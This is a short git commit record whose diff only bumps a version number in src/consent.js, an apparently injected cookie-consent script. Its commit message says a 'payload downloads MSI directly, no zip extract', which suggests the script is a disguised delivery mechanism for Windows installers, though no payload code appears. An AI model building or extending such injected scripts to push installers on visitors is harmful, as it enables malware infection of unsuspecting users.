63f79e5f1f75063791b36cd496b1fed137254ba2
luispredcon-star <luispredcon-star@users.noreply.github.com>
2026-09-25 22:58:42 +0300

    v1.6.9: j payload downloads MSI directly, no zip extract

--- src/consent.js
+++ src/consent.js
@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.6.8',
+    version: '1.6.9',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
